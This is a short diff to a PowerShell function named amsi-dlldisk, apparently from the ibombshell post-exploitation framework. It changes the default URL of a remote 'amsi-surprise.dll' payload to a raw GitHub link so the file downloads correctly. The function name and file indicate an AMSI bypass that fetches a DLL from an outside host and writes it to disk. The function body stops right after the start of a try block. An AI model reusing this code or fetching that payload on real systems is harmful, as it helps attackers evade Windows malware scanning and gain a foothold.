@@ -1,9 +1,8 @@
 function amsi-dlldisk {
        param(
             [Parameter(Mandatory=$false)]
-            [string] $dll = 'https://github.com/ElevenPaths/ibombshell/master/data/files/amsi-surprise.dll'
+            [string] $dll = 'https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/files/amsi-surprise.dll'
         )
-
 
     $output = $pwd
     try{    
